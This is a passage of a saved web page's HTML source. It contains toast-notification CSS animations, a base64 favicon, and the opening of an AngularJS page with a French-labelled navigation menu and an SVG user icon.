    bottom: 50%;
    transform: scaleY(3) translateY(50%)
}

[data-sonner-toast][data-y-position=bottom][data-swiping=true]::before {
    top: 50%;
    transform: scaleY(3) translateY(-50%)
}

[data-sonner-toast][data-swiping=false][data-removed=true]::before {
    content: "";
    position: absolute;
    inset: 0;
    transform: scaleY(2)
}

[data-sonner-toast][data-expanded=true]::after {
    content: "";
    position: absolute;
    left: 0;
    height: calc(var(--gap) + 1px);
    bottom: 100%;
    width: 100%
}

[data-sonner-toast][data-removed=true][data-front=false]::before {
    height: calc(var(--initial-height) + 20%)
}

@keyframes swipe-out-left {
    from {
        transform: var(--y) translateX(var(--swipe-amount-x));
        opacity: 1
    }

    to {
        transform: var(--y) translateX(calc(var(--swipe-amount-x) - 100%));
        opacity: 0
    }
}

@keyframes swipe-out-right {
    from {
        transform: var(--y) translateX(var(--swipe-amount-x));
        opacity: 1
    }

    to {
        transform: var(--y) translateX(calc(var(--swipe-amount-x) + 100%));
        opacity: 0
    }
}

@keyframes swipe-out-up {
    from {
        transform: var(--y) translateY(var(--swipe-amount-y));
        opacity: 1
    }

    to {
        transform: var(--y) translateY(calc(var(--swipe-amount-y) - 100%));
        opacity: 0
    }
}

@keyframes swipe-out-down {
    from {
        transform: var(--y) translateY(var(--swipe-amount-y));
        opacity: 1
    }

    to {
        transform: var(--y) translateY(calc(var(--swipe-amount-y) + 100%));
        opacity: 0
    }
}

[data-sonner-toaster][data-sonner-theme=dark] [data-sonner-toast] [data-close-button]:hover {
    background: var(--normal-bg-hover);
    border-color: var(--normal-border-hover)
}

@keyframes sonner-fade-in {
    0% {
        opacity: 0;
        transform: scale(.8)
    }

    100% {
        opacity: 1;
        transform: scale(1)
    }
}

@keyframes sonner-fade-out {
    0% {
        opacity: 1;
        transform: scale(1)
    }

    100% {
        opacity: 0;
        transform: scale(.8)
    }
}

@keyframes sonner-spin {
    0% {
        opacity: 1
    }

    100% {
        opacity: .15
    }
}
</style>
<meta name=referrer content=no-referrer>
<link type=image/x-icon rel="shortcut icon"
    href="data:image/png;base64,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">
<style>
.sf-hidden {
    display: none !important
}
</style>

</head>

<body class="public browser-mode" ng-controller="MainCtrl as main"
    ng-class="{'menu-open': menuState.opened, 'no-animations': $root.isAnimationsDisabled, 'wrapper-mode': isWrapper, 'browser-mode': isBrowser}">
    <div id=appcontainer>

        <div class="spinner-container backdrop background ng-hide sf-hidden" ng-hide=true> </div>
        <nav class="bs-d-none bs-d-sm-block" role=navigation aria-label="menu principal" ng-include=templates.menu>
            <div id=menupane class=public-menu ng-controller=PublicMenuCtrl>
                <div class="navbar navbar-default navbar-inverse navbar-static-top">
                    <div class=container-fluid>
                        <div class=navbar-header>
                            <button type=button class="close sf-hidden" ng-click=closeMenu()>

                            </button>
                            <h2 class=navbar-brand ng-bind="'menu.TITLE' | translate">Menu</h2>
                        </div>
                    </div>
                </div>
                <div class=scrollpane-container>
                    <div nav-menu ng-if=::state.isInitialized>
                        <div class="scrollpane compact-scrollbar scrollbar-width-15" scrollable>
                            <div class=scrollpane-content>
                                <ul id=menu-nav-items>
                                    <li ng-repeat="item in menuItems">



                                        <button ng-if=item.handleClickEvent
                                            class="bs-btn ing-focus-outline ing-focus-outline-dark-md bs-px-4 active"
                                            ng-class="{'active': isActive(item.href), 'subitem': !item.icon}"
                                            ng-attr-aria-current="{{ isActive(item.href) ? 'page' : undefined}}"
                                            ng-click=handleMenuItemClick(item) aria-current=page>
                                            <icon ng-if=::item.icon type=user><svg width=20px height=20px
                                                    preserveAspectRatio=xMidYMax viewBox="0 0 18 19" aria-hidden=true>
                                                    <path
                                                        d="M0,19 C0.380842548,16.5452011 2.42225111,15.7125109 4.08276912,15.0353212 C5.14608975,14.60161 6.0681775,14.2256331 6.34521123,13.566148 C6.38912017,13.0324579 6.38549882,12.6189303 6.38142479,12.1425051 L6.38051945,11.9228332 C5.96406352,11.4928771 5.53629085,10.5780469 5.38102522,9.76554249 C5.05419784,9.59609472 4.66626009,9.17411814 4.54630267,8.13912554 C4.48609763,7.61717008 4.6363839,7.21819334 4.84053784,6.95956253 C4.28692306,4.57790608 4.4494314,2.76514351 5.32444153,1.56915206 C6.06319814,0.559975592 7.28268975,0.0319181394 8.94896614,0 C10.048953,0 10.8687375,0.305099862 11.2960575,0.865075454 C12.0710276,1.02419677 12.6604033,1.43303058 13.0492464,2.08218921 C13.9772188,3.63021897 13.4344681,6.04520172 13.1714672,6.97458283 C13.3697364,7.23321364 13.5136853,7.62702715 13.4539329,8.13912554 C13.3348808,9.16895492 12.938795,9.58905396 12.6201157,9.75990988 C12.4680188,10.5747612 12.0497522,11.4895914 11.6437076,11.9200169 L11.6423496,12.1453214 C11.6382756,12.6208078 11.6346542,13.0338661 11.6781105,13.566148 C11.9546916,14.2256331 12.873158,14.6020794 13.9319519,15.0353212 C15.5864859,15.712937 17.6206978,16.5460468 18,19 L0,19 Z M16.6176881,18.0191579 C16.2123087,17.3330596 15.511775,16.8271263 14.4629208,16.3489079 C14.2112615,16.2341654 14.0042304,16.1469496 13.5468608,15.9596334 C11.7290954,15.2158325 11.1313994,14.8680984 10.7463359,13.9499458 L10.685194,13.804158 L10.6723466,13.6467936 C10.6441545,13.301478 10.6325588,12.9890785 10.6311589,12.6246115 C10.6306375,12.4888555 10.6312176,12.3840039 10.633317,12.1393481 L10.634675,11.9140436 L10.6370329,11.5228534 L10.9066102,11.2370893 C11.172134,10.9556221 11.5096646,10.2114448 11.6278983,9.57801391 L11.7156537,9.10786941 L12.1399864,8.88036872 C12.2539521,8.81926744 12.384745,8.60223167 12.4515616,8.0242561 C12.4760916,7.81402604 12.4363105,7.66864379 12.3679967,7.57953235 L12.0643735,7.1834734 L12.1999005,6.70455396 C12.6456817,5.12927246 12.7382208,3.52125869 12.181561,2.59264713 C11.9392308,2.18808616 11.592,1.94707718 11.0913458,1.84427998 L10.7199945,1.76803201 L10.4912418,1.4682662 C10.2813308,1.1931913 9.75849221,1 8.96846617,0.999813252 C7.59690858,1.02608594 6.67708327,1.42432292 6.14135736,2.1561498 C5.46666277,3.07834366 5.32939306,4.60798331 5.82383497,6.73507747 L5.93189762,7.19996408 L5.63529537,7.57571229 C5.56552533,7.66409992 5.52410032,7.81120424 5.54876206,8.02501369 C5.61664863,8.61073902 5.744911,8.8256244 5.84877247,8.87947269 L6.28156711,9.10386052 L6.37245353,9.57946876 C6.49273749,10.2089142 